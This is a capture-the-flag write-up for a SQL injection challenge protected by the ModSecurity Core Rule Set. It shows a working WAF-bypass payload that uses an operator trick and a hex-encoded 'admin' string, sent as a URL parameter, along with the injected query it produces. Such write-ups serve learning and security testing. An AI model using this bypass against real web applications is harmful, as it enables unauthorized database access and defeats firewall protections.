---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 34
tags: [SQLi, MOD Security CRS, WAF bypass]
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/a437eb74-eff7-45be-bd3f-86e2c56d7dc3)

We are provided with the SQL query:

```sql
SELECT id FROM prob_death WHERE id='{$_GET[id]}' AND pw=md5('{$_GET[pw]}')
```

In this challenge as well, the Mod Security CRS is being used

&nbsp;

## MOD Security CRS

The MOD Security Core Rule Set, is a set of regex expressions that Web Application Firewalls can use to filter traffic. In this case, out input is being filtered based on this rule set.

In order to bypass this, we can refer [this](https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1181)Github issue.

![2](https://github.com/Kunull/Write-ups/assets/110326359/31d7abb4-4869-4388-8db4-c0c69df40d67)

However, we have to modify the payload slightly.

```
-1'<@=1 OR id LIKE 0x61646d696e OR '
```

&nbsp;

If we provide the following URI parameter:

```
?id=-1'<@=1 OR id LIKE 0x61646d696e OR '
```

The resultant query becomes:

```sql
SELECT id FROM prob_death WHERE id='-1'<@=1 OR id LIKE 0x61646d696e OR '' AND pw=md5('')
```

![3](https://github.com/Kunull/Write-ups/assets/110326359/fbb5b672-a29d-42bb-8cf5-20480dd42ddb)
